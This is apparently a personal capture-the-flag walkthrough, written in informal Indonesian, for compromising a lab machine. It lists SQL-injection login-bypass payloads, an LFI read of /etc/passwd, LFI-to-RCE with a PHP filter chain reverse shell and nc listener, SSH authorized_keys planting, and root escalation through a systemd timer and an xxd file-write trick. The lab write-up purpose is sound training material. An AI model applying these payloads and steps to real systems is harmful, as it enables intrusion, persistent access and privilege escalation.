1. scan nmap lama amat -> ke /login -> coba sqli aja
2. uname admin -> admin'or1=1;-- -> admin'||1=1;-- -> admin' || '1' = '1';-- -
3. di dalem coba lfi url -> =../../../../etc/passwd -> dari /var/www/html
4. lfi to rce -> https://github.com/tucommenceapousser/php_filter_chain_generator
5. cari rev shell -> python3 gen.py --chain "revshell ip port" | grep "^php" > pelod.txt
6. curl "http://iptarget/gatauk?file=$(cat pelod.txt)" -> sambil nyalain nc
7. masuk shell -> wget ke linpeas -> run -> cek di analyze .timer file -> analyze ssh files
8. ssh keygen pake sshmu -> id rsa gantiin authorized keys
9. ssh-keygen -t rsa -> cat /user/.ssh/id_rsa.pub -> gantiin di target
10. echo "isi id_rsa" >> /user/.ssh/authorized_keys
11. tinggal pakai -> ssh -i id_rsa target@ip -> klaim user flag
12. sudo -l -> systemctl status exploit.timer -> cd /etc/systemd/system -> cat coba
13. cat exploit.service -> ls -la -> nano exploit.timer -> tambahin 3s
14. yg bisa pake sudo: -> daemon restar -> star exploit timer -> lakuin aja 
15. sudo systemctl daemon-restart -> sudo sytemctl start exploit.timer -> cat coba isinya bakal ke /opt
16. cd /opt -> ke gtfo bins yg xxd -> disitu gabisa sudo sudo an jadi file write aja
17. echo "id_rsa pub mu" | xxd | /opt/xxd -r - "/root/.ssh/authorized_keys" -> out
18. ssh -i id_rsa root@ip -> klaim root flag
